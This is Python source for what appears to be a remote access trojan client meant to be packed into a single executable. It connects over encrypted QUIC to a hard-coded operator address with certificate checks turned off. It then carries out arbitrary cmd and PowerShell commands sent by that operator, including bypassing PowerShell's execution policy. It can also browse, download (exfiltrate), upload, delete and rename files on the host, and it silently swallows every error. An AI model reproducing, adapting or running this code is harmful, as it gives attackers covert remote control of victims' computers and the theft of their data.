# pyinstaller --onefile QUIC_RSA.py

import asyncio
import os
import subprocess
import uuid
import ssl
import base64
import json
from datetime import datetime
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import StreamDataReceived, HandshakeCompleted
from aioquic.asyncio.protocol import QuicConnectionProtocol
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP

class AESCipherTCP:
    def __init__(self, key):
        self.key = key if isinstance(key, (bytes, bytearray)) else (key.encode() if isinstance(key, str) else key)
        if len(self.key) not in [16, 24, 32]:
            raise ValueError("Key must be 16, 24, or 32 bytes")

    def encrypt(self, raw):
        raw = raw.encode('utf-8') if isinstance(raw, str) else raw
        raw = self._pad(raw)
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return iv + cipher.encrypt(raw)

    def decrypt(self, enc):
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(enc[16:])
        return self._unpad(decrypted)

    def _pad(self, s):
        padding_length = 16 - len(s) % 16
        padding = bytes([padding_length]) * padding_length
        return s + padding

    def _unpad(self, s):
        return s[:-s[-1]]

class RSACipher:
    def __init__(self, private_key_pem=None):
        if private_key_pem:
            self.key = RSA.import_key(private_key_pem)
        else:
            self.key = RSA.generate(2048)
        self.private_key = self.key
        self.public_key = self.key.publickey()

    def decrypt(self, data):
        cipher = PKCS1_OAEP.new(self.private_key)
        return cipher.decrypt(data)

    def encrypt(self, data, public_key_pem):
        public_key = RSA.import_key(public_key_pem)
        cipher = PKCS1_OAEP.new(public_key)
        return cipher.encrypt(data)

    def get_public_key_pem(self):
        return self.public_key.export_key()

class QUICClientProtocol(QuicConnectionProtocol):
    def __init__(self, client, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.client = client
        self.buffers = {}
        self.handshake_done = False

    def connection_made(self, transport):
        super().connection_made(transport)

    def quic_event_received(self, event):
        if isinstance(event, HandshakeCompleted):
            self.handshake_done = True
            try:
                auth_bytes = b"8ed706ab-f01e-40aa-b927-1de380ee1fda"
                auth_msg = self.client.rsa_cipher.encrypt(auth_bytes, self.client.public_key_pem)
                stream_id = self._quic.get_next_available_stream_id()
                if stream_id is not None:
                    self._quic.send_stream_data(stream_id, auth_msg, end_stream=True)
                aes_key = os.urandom(32)
                self.client.aes_cipher = AESCipherTCP(aes_key)
                encrypted_aes_key = self.client.rsa_cipher.encrypt(aes_key, self.client.public_key_pem)
                stream_id2 = self._quic.get_next_available_stream_id()
                if stream_id2 is not None:
                    self._quic.send_stream_data(stream_id2, encrypted_aes_key, end_stream=True)
                self.transmit()
                self.client.stage = "ready"
                self.client.is_authenticated = True
            except Exception:
                pass

        if isinstance(event, StreamDataReceived):
            stream_id = event.stream_id
            if stream_id not in self.buffers:
                self.buffers[stream_id] = b""
            self.buffers[stream_id] += event.data
            if not event.end_stream:
                return
            full_data = self.buffers.pop(stream_id)
            try:
                if not self.client.is_authenticated or not self.client.aes_cipher:
                    return
                decrypted = self.client.aes_cipher.decrypt(full_data)
                command = decrypted.decode(errors="ignore").strip()
                if command == "ping":
                    resp = self.client.aes_cipher.encrypt("pong")
                    sid = self._quic.get_next_available_stream_id()
                    self._quic.send_stream_data(sid, resp, end_stream=True)
                    self.transmit()
                    return
                result = self.execute_command(command)
                encrypted_result = self.client.aes_cipher.encrypt(result)
                sid = self._quic.get_next_available_stream_id()
                self._quic.send_stream_data(sid, encrypted_result, end_stream=True)
                self.transmit()
            except Exception:
                pass

    def connection_lost(self, exc):
        self.client.is_running = False

    def browse_directory(self, path):
        try:
            if path.startswith('~'):
                path = os.path.expanduser(path)     
            if not os.path.exists(path):
                return {'success': False, 'error': f"Path does not exist: {path}", 'current_path': path, 'parent_path': None, 'items': []}
            items = []
            try:
                entries = os.listdir(path)
            except PermissionError:
                return {'success': False, 'error': f"Permission denied to access {path}", 'current_path': path, 'parent_path': None, 'items': []}
            for item in entries:
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    is_dir = os.path.isdir(item_path)
                    modified_timestamp = stat.st_mtime
                    modified_time = datetime.fromtimestamp(modified_timestamp).strftime('%Y-%m-%d %H:%M:%S')
                    size_bytes = stat.st_size if not is_dir else 0    
                    items.append({'name': item, 'type': 'directory' if is_dir else 'file', 'size': size_bytes, 'modified_time': modified_time})
                except (PermissionError, OSError):
                    continue
            items.sort(key=lambda x: (x['type'] != 'directory', x['name'].lower()))
            parent_path = os.path.dirname(path)
            if path.endswith(':\\') or path == '/':
                parent_path = None
            elif parent_path == path:
                parent_path = None
            return {'success': True, 'current_path': path, 'parent_path': parent_path, 'items': items}
        except Exception as e:
            return {'success': False, 'error': str(e), 'current_path': path, 'parent_path': None, 'items': []}

    def download_file(self, filepath):
        try:
            if not os.path.exists(filepath):
                return f"ERROR: File not found: {filepath}"
            filesize = os.path.getsize(filepath)
            filename = os.path.basename(filepath)
            with open(filepath, 'rb') as f:
                file_data = f.read()
            file_data_b64 = base64.b64encode(file_data).decode('ascii')
            return f"file-data:{filename}|{filesize}|{file_data_b64}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def upload_file(self, filepath, filedata_b64):
        try:
            file_data = base64.b64decode(filedata_b64)
            directory = os.path.dirname(filepath)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            with open(filepath, 'wb') as f:
                f.write(file_data)
            return f"SUCCESS: File uploaded to {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def delete_file(self, filepath):
        try:
            if os.path.isdir(filepath):
                os.rmdir(filepath)
            else:
                os.remove(filepath)
            return f"SUCCESS: Deleted {filepath}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def rename_file(self, old_path, new_path):
        try:
            os.rename(old_path, new_path)
            return f"SUCCESS: Renamed to {new_path}"
        except Exception as e:
            return f"ERROR: {str(e)}"

    def run_cmd_command(self, cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            return output.strip() if output.strip() else "[+] Command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 90 seconds"
        except Exception as e:
            return f"[-] CMD execution error: {str(e)}"

    def run_powershell_command(self, ps_cmd):
        try:
            result = subprocess.run(
                [
                    "powershell.exe",
                    "-NoProfile",
                    "-ExecutionPolicy", "Bypass",
                    "-Command",
                    ps_cmd
                ],
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="replace",
            )
            output = result.stdout + result.stderr
            if result.returncode != 0:
                output += f"\n[Exit Code: {result.returncode}]"
            return output.strip() if output.strip() else "[+] PowerShell command executed (no output)"
        except subprocess.TimeoutExpired:
            return "[-] PowerShell command timed out after 120 seconds"
        except Exception as e:
            return f"[-] PowerShell execution error: {str(e)}"

    def execute_command(self, command: str) -> str:
        command = (command or "").strip()
        if not command:
            return "[no command received]"

        if command.startswith("browse:"):
            browse_path = command[7:].strip()
            if not browse_path:
                browse_path = os.getcwd()
            dir_data = self.browse_directory(browse_path)
            json_str = json.dumps(dir_data, ensure_ascii=False)
            base64_data = base64.b64encode(json_str.encode('utf-8')).decode('ascii')
            return f"browse-data-{base64_data}"
        
        if command.startswith("download-file:"):
            filepath = command[14:].strip()
            return self.download_file(filepath)
        
        if command.startswith("upload-file:"):
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                filepath, filedata_b64 = parts
                return self.upload_file(filepath, filedata_b64)
            else:
                return "ERROR: Invalid upload format"
        
        if command.startswith("delete-file:"):
            filepath = command[12:].strip()
            return self.delete_file(filepath)
        
        if command.startswith("rename-file:"):
            parts = command[12:].split('|', 1)
            if len(parts) == 2:
                old_path, new_path = parts
                return self.rename_file(old_path, new_path)
            else:
                return "ERROR: Invalid rename format"

        upper_cmd = command.upper()
        if upper_cmd.startswith("EP "):
            ps_command = command[3:].strip()
            result_str = self.run_powershell_command(ps_command)
        elif upper_cmd.startswith("EP"):
            ps_command = command[2:].strip()
            result_str = self.run_powershell_command(ps_command)
        else:
            result_str = self.run_cmd_command(command)

        return result_str

class QUIC_ClientAES:
    def __init__(self, host, port, public_key_pem=None):
        self.host = host
        self.port = port
        self.public_key_pem = public_key_pem
        self.config = QuicConfiguration(is_client=True)
        self.config.verify_mode = ssl.CERT_NONE
        self.rsa_cipher = RSACipher()
        self.aes_cipher = None
        self.is_running = True
        self.client_id = str(uuid.uuid4())
        self.stage = "auth"
        self.is_authenticated = False

    async def start_client(self):
        try:
            async with connect(
                self.host,
                self.port,
                configuration=self.config,
                create_protocol=lambda *a, **kw: QUICClientProtocol(self, *a, **kw)
            ) as connection:
                while self.is_running:
                    await asyncio.sleep(1)
        except Exception:
            pass
        finally:
            self.is_running = False

    def run(self):
        try:
            asyncio.run(self.start_client())
        except Exception:
            pass

if __name__ == "__main__":
    public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArzyg7KTBT/MpciW4UKSk
jWUz6y87YLNktzndjJvIpYTReAzK3ewzJihvz5l/uF4dCPZVhl9zvQW/9X501SmU
nCPz4F+iiunt4mXVqv4rK3/QAM5UH3gUwTdFTnUCYMR94ZoR0NvKfIDnDV6sZxiR
ETOwK5w+aQNF6H1/NcB1UuPKz1GpLtY9jcYYV6x+ihT1V/rGfFHdpNySHD6og+z1
NSq0D3JiGAuSSfhhV+aPCZ8By8eh735r50WCiBFUw3Bd6oPjyeKDwUVBgGip+3UH
0tlqFIZxHBPTCSZ6zJDW+40XWLlRSk5z1PLBJokiEQLiyxmA34rbmUzsRBD32L9y
jwIDAQAB
-----END PUBLIC KEY-----"""

    client = QUIC_ClientAES("192.168.1.107", 1111, public_key_pem=public_key_pem)
    client.run()
